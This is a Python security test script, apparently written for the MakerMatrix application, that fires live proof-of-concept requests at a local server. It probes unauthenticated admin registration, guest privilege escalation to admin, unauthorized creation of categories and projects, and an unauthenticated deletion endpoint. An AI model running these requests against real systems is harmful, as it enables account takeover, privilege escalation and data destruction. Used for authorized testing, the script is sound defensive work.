#!/usr/bin/env python3
"""
Manual Security Exploitation Test

This script performs real exploitation attempts to demonstrate vulnerabilities.
Run this to gather proof-of-concept evidence of security issues.

WARNING: This is for authorized security testing only!
"""

import requests
import json
import urllib3

# Disable SSL warnings for self-signed cert
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://10.2.0.2:8443"
GUEST_TOKEN_FILE = "/tmp/guest_token.json"


def load_guest_token():
    """Load guest token from file"""
    try:
        with open(GUEST_TOKEN_FILE, 'r') as f:
            data = json.load(f)
            return data['access_token'], data['user']
    except Exception as e:
        print(f"[ERROR] Failed to load guest token: {e}")
        return None, None


def test_unauthenticated_user_registration():
    """
    CRITICAL TEST: Attempt to register user WITHOUT authentication
    This should return 401 Unauthorized, but likely succeeds!
    """
    print("\n" + "="*80)
    print("TEST 1: Unauthenticated User Registration (CRITICAL)")
    print("="*80)

    url = f"{BASE_URL}/api/users/register"
    payload = {
        "username": "security_test_hacker",
        "email": "hacker@evil.com",
        "password": "EvilPass123!",
        "roles": ["admin"]  # Attempting to create admin!
    }

    try:
        response = requests.post(
            url,
            json=payload,
            headers={"Content-Type": "application/json"},
            verify=False,
            timeout=10
        )

        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:500]}")

        if response.status_code == 200:
            print("\n[CRITICAL VULNERABILITY CONFIRMED]")
            print("✗ Unauthenticated user registration succeeded!")
            print("✗ Anyone can create admin accounts!")
            return True, response.json()
        elif response.status_code == 401:
            print("\n[SECURE] Authentication required")
            return False, None
        else:
            print(f"\n[UNEXPECTED] Status code: {response.status_code}")
            return False, None

    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False, None


def test_guest_create_category(guest_token):
    """
    HIGH TEST: Attempt to create category with guest (viewer) token
    Guests should only have READ access, not CREATE
    """
    print("\n" + "="*80)
    print("TEST 2: Guest User Creates Category (HIGH)")
    print("="*80)

    url = f"{BASE_URL}/api/categories/add_category"
    payload = {
        "name": "Security Test Category",
        "description": "Created by guest user - should be blocked!"
    }
    headers = {
        "Authorization": f"Bearer {guest_token}",
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, verify=False, timeout=10)

        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:500]}")

        if response.status_code == 200:
            print("\n[HIGH VULNERABILITY CONFIRMED]")
            print("✗ Guest user created category!")
            print("✗ READ-ONLY permissions not enforced!")
            return True, response.json()
        elif response.status_code == 403:
            print("\n[SECURE] Permission denied - expected behavior")
            return False, None
        else:
            print(f"\n[UNEXPECTED] Status code: {response.status_code}")
            return False, None

    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False, None


def test_guest_modify_user_roles(guest_token, guest_user):
    """
    CRITICAL TEST: Attempt privilege escalation via role modification
    Guest tries to assign admin role to self
    """
    print("\n" + "="*80)
    print("TEST 3: Guest User Privilege Escalation (CRITICAL)")
    print("="*80)

    user_id = guest_user['id']
    url = f"{BASE_URL}/api/users/{user_id}/roles"

    # First, get all roles to find admin role ID
    roles_url = f"{BASE_URL}/api/users/roles"
    headers = {
        "Authorization": f"Bearer {guest_token}",
        "Content-Type": "application/json"
    }

    try:
        roles_response = requests.get(roles_url, headers=headers, verify=False, timeout=10)
        print(f"Get Roles Status: {roles_response.status_code}")

        if roles_response.status_code == 200:
            roles_data = roles_response.json()
            admin_role_id = None

            for role in roles_data.get('data', []):
                if role.get('name') == 'admin':
                    admin_role_id = role.get('id')
                    print(f"Found admin role ID: {admin_role_id}")
                    break

            if admin_role_id:
                # Attempt to escalate privileges
                payload = {"role_ids": [admin_role_id]}
                escalate_response = requests.put(
                    url,
                    json=payload,
                    headers=headers,
                    verify=False,
                    timeout=10
                )

                print(f"\nEscalation Status Code: {escalate_response.status_code}")
                print(f"Response: {escalate_response.text[:500]}")

                if escalate_response.status_code == 200:
                    print("\n[CRITICAL VULNERABILITY CONFIRMED]")
                    print("✗ Guest escalated privileges to admin!")
                    print("✗ Complete system compromise possible!")
                    return True, escalate_response.json()
                elif escalate_response.status_code == 403:
                    print("\n[SECURE] Permission denied")
                    return False, None
                else:
                    print(f"\n[UNEXPECTED] Status: {escalate_response.status_code}")
                    return False, None
            else:
                print("\n[INFO] Admin role not found in roles list")
                return False, None
        else:
            print(f"\n[INFO] Could not retrieve roles list: {roles_response.status_code}")
            return False, None

    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False, None


def test_cleanup_locations_no_auth():
    """
    CRITICAL TEST: Test completely unauthenticated endpoint
    This endpoint has NO authentication requirement at all!
    """
    print("\n" + "="*80)
    print("TEST 4: Unauthenticated Location Cleanup (CRITICAL)")
    print("="*80)

    url = f"{BASE_URL}/api/locations/cleanup-locations"

    try:
        # No authentication header at all
        response = requests.delete(
            url,
            headers={"Content-Type": "application/json"},
            verify=False,
            timeout=10
        )

        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:500]}")

        if response.status_code == 200:
            print("\n[CRITICAL VULNERABILITY CONFIRMED]")
            print("✗ Unauthenticated location cleanup succeeded!")
            print("✗ Anyone can delete locations without login!")
            return True, response.json()
        elif response.status_code == 401:
            print("\n[SECURE] Authentication required")
            return False, None
        else:
            print(f"\n[UNEXPECTED] Status code: {response.status_code}")
            return False, None

    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False, None


def test_guest_create_project(guest_token):
    """
    HIGH TEST: Guest tries to create project
    """
    print("\n" + "="*80)
    print("TEST 5: Guest User Creates Project (HIGH)")
    print("="*80)

    url = f"{BASE_URL}/api/projects/"
    payload = {
        "name": "Security Test Project",
        "description": "Created by guest - should be blocked!"
    }
    headers = {
        "Authorization": f"Bearer {guest_token}",
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, verify=False, timeout=10)

        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:500]}")

        if response.status_code == 200:
            print("\n[HIGH VULNERABILITY CONFIRMED]")
            print("✗ Guest created project!")
            return True, response.json()
        elif response.status_code == 403:
            print("\n[SECURE] Permission denied")
            return False, None
        else:
            print(f"\n[UNEXPECTED] Status: {response.status_code}")
            return False, None

    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False, None


def main():
    """Run all security tests"""
    print("\n" + "="*80)
    print("MAKERMATRIX SECURITY EXPLOITATION TEST SUITE")
    print("Authorized Security Testing - Proof of Concept")
    print("="*80)

    # Load guest credentials
    guest_token, guest_user = load_guest_token()

    if not guest_token:
        print("\n[ERROR] Could not load guest token. Skipping authenticated tests.")
        print("Running unauthenticated tests only...\n")

    # Track results
    vulnerabilities = []

    # Test 1: Unauthenticated user registration
    vuln, data = test_unauthenticated_user_registration()
    if vuln:
        vulnerabilities.append({
            "severity": "CRITICAL",
            "test": "Unauthenticated User Registration",
            "endpoint": "POST /api/users/register",
            "impact": "Anyone can create admin accounts",
            "cvss": 9.8
        })

    if guest_token:
        # Test 2: Guest creates category
        vuln, data = test_guest_create_category(guest_token)
        if vuln:
            vulnerabilities.append({
                "severity": "HIGH",
                "test": "Guest Creates Category",
                "endpoint": "POST /api/categories/add_category",
                "impact": "Read-only users can modify data",
                "cvss": 7.5
            })

        # Test 3: Privilege escalation
        vuln, data = test_guest_modify_user_roles(guest_token, guest_user)
        if vuln:
            vulnerabilities.append({
                "severity": "CRITICAL",
                "test": "Privilege Escalation",
                "endpoint": "PUT /api/users/{user_id}/roles",
                "impact": "Guest can become admin",
                "cvss": 9.9
            })

        # Test 5: Guest creates project
        vuln, data = test_guest_create_project(guest_token)
        if vuln:
            vulnerabilities.append({
                "severity": "HIGH",
                "test": "Guest Creates Project",
                "endpoint": "POST /api/projects/",
                "impact": "Unauthorized data creation",
                "cvss": 7.5
            })

    # Test 4: Unauthenticated cleanup
    vuln, data = test_cleanup_locations_no_auth()
    if vuln:
        vulnerabilities.append({
            "severity": "CRITICAL",
            "test": "Unauthenticated Location Cleanup",
            "endpoint": "DELETE /api/locations/cleanup-locations",
            "impact": "Unauthenticated data deletion",
            "cvss": 9.1
        })

    # Final Report
    print("\n" + "="*80)
    print("SECURITY TEST RESULTS SUMMARY")
    print("="*80)
    print(f"\nTotal Tests Run: 5")
    print(f"Vulnerabilities Found: {len(vulnerabilities)}\n")

    if vulnerabilities:
        print("CONFIRMED VULNERABILITIES:\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"{i}. [{vuln['severity']}] {vuln['test']}")
            print(f"   Endpoint: {vuln['endpoint']}")
            print(f"   Impact: {vuln['impact']}")
            print(f"   CVSS Score: {vuln['cvss']}")
            print()

        # Save results
        results_file = "/home/ril3y/MakerMatrix/tests/security_exploitation_results.json"
        with open(results_file, 'w') as f:
            json.dump(vulnerabilities, f, indent=2)
        print(f"Results saved to: {results_file}")
    else:
        print("[SUCCESS] No vulnerabilities found - all security controls working!")

    print("="*80 + "\n")


if __name__ == "__main__":
    main()
